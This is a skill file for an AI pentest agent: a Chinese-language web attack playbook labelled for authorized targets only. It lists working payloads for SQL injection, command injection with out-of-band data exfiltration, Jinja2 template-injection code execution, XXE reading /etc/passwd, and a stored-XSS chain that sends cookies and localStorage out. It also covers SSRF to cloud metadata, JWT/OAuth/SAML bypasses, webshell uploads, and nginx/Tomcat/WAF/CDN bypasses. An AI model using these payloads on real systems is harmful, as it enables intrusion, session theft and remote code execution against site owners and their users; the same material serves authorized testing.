---
name: web-attack-methods
description: "Web full-stack attack playbook: SQLi, command injection, SSTI, XSS, SSRF, NoSQL, JWT/OAuth/SAML auth bypass, LFI, upload, path traversal, WAF/CDN bypass. Use when testing web injection, auth bypass, server-side issues, or WAF/CDN restrictions."
version: 1.0.0
author: Covo Agent
license: MIT
platforms: [linux, macos, windows]
metadata:
  tags: [security, pentest, web, sqli, jwt, ssrf, waf-bypass]
  related_skills: [web-pentest, pentest-verification, post-exploitation]
---

# Web Attack Methods — Web 攻击手法(注入 / 认证 / 服务端 / CDN 绕过)

仅用于已授权目标。本项目 scan recipe 对照:sqlmap(SQLi 检测)、dalfox(XSS)、nuclei(模板扫描)、
katana/ffuf/gobuster(端点与目录发现)、jwt-analyzer(JWT)。

```
=== Web注入 ===
SQLi: scan recipe=sqlmap | 手测 ' OR 1=1-- / ' AND SLEEP(5)-- | 绕过 SEL/**/ECT,大小写,CHAR() | 升级 OUTFILE→写文件 / xp_cmdshell / UDF
命令注入: ; | && $(cmd) `cmd` %0a | 绕空格$IFS,绕cat用tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/属性/JS/href/DOM/SVG | 绕CSP用JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">
🚨Stored XSS via WebSocket/STOMP聊天: 客服系统(OCS/LiveChat)的agent面板常用innerHTML/v-html渲染visitor消息(Vue domProps innerHTML)
  攻击链: visitor STOMP连接→发含<img src=x onerror=fetch(...)>的消息→agent打开对话→XSS在agent浏览器执行
  关键: agent浏览器通常能出网(不受后端air-gap限制)! payload目标: document.cookie + localStorage + fetch(admin API)
SSRF: 绕IP 2130706433/[::1]/nip.io/#@ | 云元数据169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== 认证授权 ===
认证绕过: admin'-- | 密码重置(可预测token/Host头注入) | MFA绕过(跳过/爆破4-6位) | X-Forwarded-For轮换IP
IDOR: 换资源ID水平越权 | 批量赋值 {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a(alg none/RS256→HS256) | -C爆弱密钥 | kid注入 | jku/x5u远程密钥
401/403绕过: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri操纵(替换/后缀/@混淆/路径穿越) | state缺失→CSRF | PKCE降级 | id_token套JWT全攻击
SAML: XSW签名包装 | 签名剥离 | 注释截断 admin<!---->@evil | Golden SAML(IdP私钥)

=== 服务端 ===
LFI: ../../../etc/passwd | php://filter读源码 | data:// expect:// phar:// | RCE链:日志投毒/会话投毒/phar反序列化
文件上传: shell.php.jpg/.PHP/.php./%00 | .htaccess改解析 | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator路径穿越绕过认证拦截器: 拦截器匹配/api/*但actuator白名单→/actuator/../api/v1/endpoint绕过
  原理: 拦截器对路径匹配在规范化前,Tomcat规范化后路由→穿越绕过拦截器但到达目标Servlet
  验证: /actuator/health返回200(白名单)→/actuator/../target也200(绕过)vs直接/target 403(被拦截)
  升级: 绕过后结合X-HTTP-Method-Override: POST让GET请求触发POST处理器

=== Web杂项 ===
🚨Tomcat ..;/ 绕过nginx路径限制: nginx不解析;(视为路径一部分)但Tomcat把..;/当路径穿越:
  /api/v1/v/..;/admin/path → nginx匹配/api/v1/v/(放行) → Tomcat解析为/admin/path(穿越!)
  验证: 正常/admin返回nginx 403, /api/v1/v/..;/admin返回Tomcat 404 = 绕过成功
🚨X-Forwarded-For绕过应用层IP黑名单: CDN信任XFF头,应用从XFF取客户端IP做黑名单:
  有效: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  无效: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
🚨PATH_INFO nginx deny bypass: nginx deny .php(146B标准404)但PHP-FPM通过PATH_INFO仍可达:
  /denied/file.php/x → 16B "File not found."(PHP-FPM执行!) 说明穿透了nginx deny
  利用: cgi.fix_pathinfo=1(默认)时 /uploads/shell.jpg/x.php → PHP执行shell.jpg
🚨响应大小指纹(隐藏文件发现): CMS catch-all路由返回固定大小首页(如44004B), nginx真实404返回146B
  批量扫描路径按响应大小分类: catch-all=不存在, nginx404(146B)=存在但被禁, 其他=可访问
WAF绕过决策树: 编码→协议级→路径→变异→IP伪造→走私 | CORS: Origin反射+Credentials:true

=== CDN绕过(目标藏在CDN后,admin接口被502) ===
CDN 502分析: 区分URL模式过滤(时序固定~0.3s,所有方法/编码/端口/节点都502)vs响应内容过滤vs后端挂了
  ①WebSocket升级: WS路径可能不在过滤规则中(/api/v1/a/ws/返回200而doLogin返回502=WS不受过滤)
  ②找源站IP直连: DNS历史/证书透明/SNI扫描/邮件头Return-Path/Shodan指纹/CDN回源泄露
  ③非标端口: 扫CDN节点全端口(如8085暴露actuator)
  ④路径穿越: /api/v1/v/..;/a/doLogin 返回Tomcat 404=穿透CDN,返回502=CDN URL拦截
  ⑤泛解析识别: 所有子域名解析到CDN=通配符DNS,不是真实记录
```

## 记录要求

- 每验证一个注入点/绕过/越权,立即 finding_upsert(evidence 附请求/响应对)。
- 线索(如"该路径可能存在穿越")以低 severity + evidence 注明"待验证"记录,验证后更新。
